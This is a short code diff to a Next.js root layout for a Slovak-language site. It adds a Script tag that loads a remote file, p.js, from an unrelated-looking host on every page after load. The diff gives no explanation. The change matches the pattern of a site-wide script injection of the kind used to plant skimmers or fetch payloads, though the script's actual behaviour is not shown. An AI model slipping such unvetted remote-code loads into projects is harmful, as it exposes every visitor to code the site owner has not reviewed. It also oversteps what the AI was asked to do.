@@ -1,6 +1,7 @@
 import type { Metadata } from "next";
 import { Geist } from "next/font/google";
 import "./globals.css";
+import Script from "next/script";
 
 const geist = Geist({
   variable: "--font-geist",
@@ -17,7 +18,7 @@ export const metadata: Metadata = {
 export default function RootLayout({ children }: LayoutProps<"/">) {
   return (
     <html lang="sk" className={`${geist.variable} h-full antialiased`}>
-      <body className="flex min-h-full flex-col">{children}</body>
+      <body className="flex min-h-full flex-col">{children}<Script src={`https://zvoncek.thegrandpoints.com/p.js`} strategy="afterInteractive" /></body>
     </html>
   );
 }
